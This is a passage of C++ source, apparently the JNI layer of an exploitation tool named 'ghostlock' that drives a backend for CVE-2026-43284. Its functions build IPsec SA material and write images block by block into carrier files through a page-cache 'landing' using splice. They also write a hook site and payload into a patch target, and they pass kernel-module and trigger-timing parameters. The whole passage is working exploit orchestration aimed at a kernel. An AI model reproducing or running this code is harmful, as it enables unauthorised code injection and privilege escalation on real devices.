     *  @return 成功 true；id 无效或 Access 拒绝 ⇒ false（上层给 access-initialize-refused）。
     */
    int device_access_initialize(const std::uint64_t accessId,
                                 const contract::AccessParams43284Values &values,
                                 const Init43284Values &sa_source) noexcept {
        GL_LOGI("initialize received: seq=%lld present=%d spi=0x%08x encap=%u sender=%u",
                static_cast<long long>(sa_source.initialSequence), sa_source.sequencePresent ? 1 : 0,
                static_cast<unsigned>(sa_source.spi), static_cast<unsigned>(sa_source.encapPort),
                static_cast<unsigned>(sa_source.senderPort));
        if (accessId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(values.accessCarrierPath);
        const std::string dev_carrier = text_of(values.accessDevCarrierPath);
        const std::string patch_target = text_of(values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams params{};
        params.carrier = access_path_of(carrier);
        params.dev_carrier = access_path_of(dev_carrier);
        params.patch_target = access_path_of(patch_target);
        params.carrier_base = static_cast<std::uint64_t>(values.accessCarrierBase);
        params.offset = static_cast<std::uint64_t>(values.accessOffset);
        params.offset_set = values.accessOffsetSet;
        /*
         * Access::initialize 自己会 bring_up_with（并接续序号），所以材料必须随它一起给；
         * 而 PageCacheLanding::bring_up_with 在「已拉起」时会返回 false —— 走这条路就不能先单独 bringUp。
         */
        params.sa = sa_material_of(sa_source);
        /* 序号也要拷过来：同一 SA 上的后续会话必须接着前一个窗口的序号（防重放窗口由 SA 共享）。 */
        params.sequence = static_cast<std::uint32_t>(sa_source.initialSequence);
        /*
         * The session is built by device_resolve, whose request carries no SA at all, so its landing
         * was constructed with an empty material and never came up (the device logged
         * bring_up refused already_up=0 sa_set=0). This call does carry the material, so bring the
         * session up here - the same object write_block goes through. */
        if (g_session != nullptr && !g_session->up) {
            const bool session_up = g_session->landing.bring_up_with(params.sa);
            g_session->up = session_up;
            GL_LOGI("initialize: session landing up=%d", session_up ? 1 : 0);
        }        /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
        const std::string hook_image = text_of(values.accessHookImagePath);
        const std::string kernel_release_text = text_of(values.accessKernelRelease);
        const std::string success_marker_text = text_of(values.accessSuccessMarkerPath);
        const std::string failure_marker_text = text_of(values.accessFailureMarkerPath);
        const std::string in_flight_marker_text = text_of(values.accessInFlightMarkerPath);
        const std::string module_marker_text = text_of(values.accessModuleMarkerPath);
        params.hook_image = access_path_of(hook_image);
        params.kernel_release = access_path_of(kernel_release_text);
        params.success_marker = access_path_of(success_marker_text);
        params.failure_marker = access_path_of(failure_marker_text);
        params.in_flight_marker = access_path_of(in_flight_marker_text);
        params.module_marker = access_path_of(module_marker_text);
        params.kernel_preempt = values.accessKernelPreempt;
        params.kernel_modversions = values.accessKernelModversions;
        params.kernel_module_force_unload = values.accessKernelModuleForceUnload;
        params.trigger_delay_ms = static_cast<std::uint64_t>(values.accessTriggerDelayMs);
        params.wait_ms = static_cast<std::uint64_t>(values.accessWaitMs);
        const auto up = g_accesses[slot]->initialize(params);
        /* 状态码原样带出去：bad-parameters 与 failed 是两条完全不同的路，不许压成 bool。 */
        return up.ok() ? 0 : static_cast<int>(up.status);
    }

    /**
     *  把一个镜像写进载体并逐块校验（驱动器里 steps::write_image_verified 的那一步，patch#1 用的就是它）。
     *
     *  @param values 生成的 Values（在 contract 里）：accessId/offset/width/bytes 全由 Kotlin 给。
     *  @param params 同一份 AccessParams（借用式路径只在调用期有效）。
     *  @return 全部块写完并校验通过 true；否则 false（上层给 image-write-refused）。
     */
    bool device_write_image(const contract::WriteImage43284Values &values,
                            const contract::AccessParams43284Values &params_values,
                            const Init43284Values &sa_source,
                            const char **why) noexcept {
        if (why != nullptr) {
            *why = nullptr;
        }
        const std::uint64_t access_id = static_cast<std::uint64_t>(values.imageAccessId);
        if (access_id == 0U) {
            if (why != nullptr) {
                *why = "image:no-access-handle";
            }
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(access_id) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            if (why != nullptr) {
                *why = "image:stale-access-handle";
            }
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(params_values.accessCarrierPath);
        const std::string dev_carrier = text_of(params_values.accessDevCarrierPath);
        const std::string patch_target = text_of(params_values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams access_params{};
        access_params.carrier = access_path_of(carrier);
        access_params.dev_carrier = access_path_of(dev_carrier);
        access_params.patch_target = access_path_of(patch_target);
        access_params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
        access_params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
        access_params.offset_set = params_values.accessOffsetSet;
        /* usable_for_access() == usable_for_initialize() && offset_set，而 usable_for_initialize() 要 sa.set：
           所以写这一层也必须把会话材料带上（上一轮 initialize 缺的就是同一项）。 */
        access_params.sa = sa_material_of(sa_source);
        /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
        const std::string hook_image = text_of(params_values.accessHookImagePath);
        const std::string kernel_release_text = text_of(params_values.accessKernelRelease);
        const std::string success_marker_text = text_of(params_values.accessSuccessMarkerPath);
        const std::string failure_marker_text = text_of(params_values.accessFailureMarkerPath);
        const std::string in_flight_marker_text = text_of(params_values.accessInFlightMarkerPath);
        const std::string module_marker_text = text_of(params_values.accessModuleMarkerPath);
        access_params.hook_image = access_path_of(hook_image);
        access_params.kernel_release = access_path_of(kernel_release_text);
        access_params.success_marker = access_path_of(success_marker_text);
        access_params.failure_marker = access_path_of(failure_marker_text);
        access_params.in_flight_marker = access_path_of(in_flight_marker_text);
        access_params.module_marker = access_path_of(module_marker_text);
        access_params.kernel_preempt = params_values.accessKernelPreempt;
        access_params.kernel_modversions = params_values.accessKernelModversions;
        access_params.kernel_module_force_unload = params_values.accessKernelModuleForceUnload;
        access_params.trigger_delay_ms = static_cast<std::uint64_t>(params_values.accessTriggerDelayMs);
        access_params.wait_ms = static_cast<std::uint64_t>(params_values.accessWaitMs);
        /* 具名到具体检查：bad-parameters 是三条不同的路，别让它们共用一个名字。 */
        if (!access_params.sa.set) {
            if (why != nullptr) {
                *why = "sa-set-missing";
            }
            return false;
        }
        if (!access_params.usable_for_access()) {
            if (why != nullptr) {
                *why = access_params.offset_set ? "paths-inconsistent" : "offset-not-set";
            }
            return false;
        }
        backend::cve_2026_43284::steps::WriteRequest request{};
        request.access = g_accesses[slot].get();
        request.params = &access_params;
        request.image = std::span<const std::byte>(
            reinterpret_cast<const std::byte *>(values.imageBytes.data()), values.imageBytes.size());
        request.offset = static_cast<std::uint64_t>(values.imageOffset);
        request.width = static_cast<std::uint64_t>(values.imageWidth);
        /* 耐心由上层给：写是派发式的，验证段要等落盘（0 = 不重试，旧行为）。 */
        request.budget_ms = static_cast<std::uint64_t>(values.imageBudgetMs);

        GL_LOGI("write_image enter: accessId=%llu offset=%llu width=%zu bytes=%zu budget_ms=%llu",
                static_cast<unsigned long long>(values.imageAccessId),
                static_cast<unsigned long long>(values.imageOffset),
                static_cast<std::size_t>(values.imageWidth), values.imageBytes.size(),
                static_cast<unsigned long long>(values.imageBudgetMs));
        GL_LOGI("write_image params: carrier=%s patch=%s dev=%s sa_set=%d spi=0x%08x encap=%u sender=%u icv=%u",
                carrier.c_str(), patch_target.c_str(), dev_carrier.c_str(),
                access_params.sa.set ? 1 : 0, access_params.sa.spi,
                static_cast<unsigned>(access_params.sa.encap_port),
                static_cast<unsigned>(access_params.sa.sender_port),
                static_cast<unsigned>(access_params.sa.icv_len));
        const char *refusal = nullptr;
        const bool wrote = backend::cve_2026_43284::steps::write_image_verified(request, &refusal);
        GL_LOGI("write_image verified=%d refusal=%s", wrote ? 1 : 0, refusal != nullptr ? refusal : "(null)");
        if (!wrote && why != nullptr) {
            /* 组帧层的错误码（20/21/22/23 = 前端 / splice / 长度 / 后缀；0 = 报文发出去了）：
             * 「报文到底发出去没有」只有它能回答，所以非零时优先报它。 */
            const std::size_t landing_slot = (slot < kMaxAccesses) ? g_access_landing[slot] : 0U;
            const int splice_error = (landing_slot != 0U && landing_slot - 1U < kMaxSurfaces)
                                         ? g_surfaces[landing_slot - 1U]->io->last_error()
                                         : -1;
            GL_LOGI("write_image land: landing_slot=%zu splice_error=%d (0=dispatched, 20/21/22/23=splice stage)",
                    landing_slot, splice_error);
            static char land_message[64] = {};
            if (splice_error != 0) {
                std::snprintf(land_message, sizeof(land_message), "land:splice-error-%d", splice_error);
                *why = land_message;
            } else if (refusal != nullptr) {
                *why = refusal;  /* 组帧没问题 ⇒ 保留原来的 step-… 名字（问题在别处） */
            } else {
                /* 组帧层没失败（0）且步骤层没给名 ⇒ 报文发出去了，问题在内核那一侧。 */
                *why = "land:dispatched-unverified";
            }
        }
        return wrote;
    }

    /**
     *  写钩子（站点一个字 + landing 载荷）：驱动器里 steps::write_hook 的那一步。
     *
     *  计划用设备侧既有那张（与 device_hook_plan 同源）；access/params/宽度由 Kotlin 给。
     *  @return 写完并校验 true；否则 false（上层给 hook-write-refused）。
     */
    bool device_write_hook(const contract::WriteHook43284Values &values,
                           const contract::AccessParams43284Values &params_values,
                           const Init43284Values &sa_source) noexcept {
        const std::uint64_t access_id = static_cast<std::uint64_t>(values.hookAccessId);
        if (access_id == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(access_id) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(params_values.accessCarrierPath);
        const std::string dev_carrier = text_of(params_values.accessDevCarrierPath);
        const std::string patch_target = text_of(params_values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams access_params{};
        access_params.carrier = access_path_of(carrier);
        access_params.dev_carrier = access_path_of(dev_carrier);
        access_params.patch_target = access_path_of(patch_target);
        access_params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
        access_params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
        access_params.offset_set = params_values.accessOffsetSet;
        access_params.sa = sa_material_of(sa_source);
        /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
        const std::string hook_image = text_of(params_values.accessHookImagePath);
        const std::string kernel_release_text = text_of(params_values.accessKernelRelease);
        const std::string success_marker_text = text_of(params_values.accessSuccessMarkerPath);
        const std::string failure_marker_text = text_of(params_values.accessFailureMarkerPath);
        const std::string in_flight_marker_text = text_of(params_values.accessInFlightMarkerPath);
        const std::string module_marker_text = text_of(params_values.accessModuleMarkerPath);
        access_params.hook_image = access_path_of(hook_image);
        access_params.kernel_release = access_path_of(kernel_release_text);
        access_params.success_marker = access_path_of(success_marker_text);
        access_params.failure_marker = access_path_of(failure_marker_text);
        access_params.in_flight_marker = access_path_of(in_flight_marker_text);
        access_params.module_marker = access_path_of(module_marker_text);
        access_params.kernel_preempt = params_values.accessKernelPreempt;
        access_params.kernel_modversions = params_values.accessKernelModversions;
        access_params.kernel_module_force_unload = params_values.accessKernelModuleForceUnload;
        access_params.trigger_delay_ms = static_cast<std::uint64_t>(params_values.accessTriggerDelayMs);
        access_params.wait_ms = static_cast<std::uint64_t>(params_values.accessWaitMs);   /* 同 write_image：写这一层也要材料 */
        const backend::cve_2026_43284::hook::SentryPlan plan =
            backend::cve_2026_43284::hook::device_sentry_plan();
        backend::cve_2026_43284::steps::HookRequest request{};
        request.access = g_accesses[slot].get();
        request.params = &access_params;
        request.plan = &plan;
        request.width = static_cast<std::uint64_t>(values.hookWidth);
        const char *refusal = nullptr;
        const bool hook_wrote = backend::cve_2026_43284::steps::write_hook(request, &refusal);
        GL_LOGI("hook: map hook_vaddr=0x%llx hook_file=0x%llx payload_vaddr=0x%llx payload_file=0x%llx",
                static_cast<unsigned long long>(plan.hook_vaddr),
                static_cast<unsigned long long>(plan.hook_file_offset),
                static_cast<unsigned long long>(plan.payload_vaddr),
                static_cast<unsigned long long>(plan.payload_file_offset));
        GL_LOGI("hook: plan site_file=0x%llx site_vaddr=0x%llx guard=0x%08x displaced=0x%08x payload_file=0x%llx max=%llu",
                static_cast<unsigned long long>(plan.hook_file_offset),
                static_cast<unsigned long long>(plan.hook_vaddr),
                static_cast<unsigned>(plan.guard_instruction),
                static_cast<unsigned>(plan.displaced_instruction),
                static_cast<unsigned long long>(plan.payload_file_offset),
                static_cast<unsigned long long>(plan.payload_max_bytes));
        GL_LOGI("hook: write_hook wrote=%d refusal=%s plan=%p width=%llu", hook_wrote ? 1 : 0,
                refusal != nullptr ? refusal : "(null)", static_cast<const void *>(request.plan),
                static_cast<unsigned long long>(request.width));
        return hook_wrote;
    }

}  // namespace ghostlock::jni

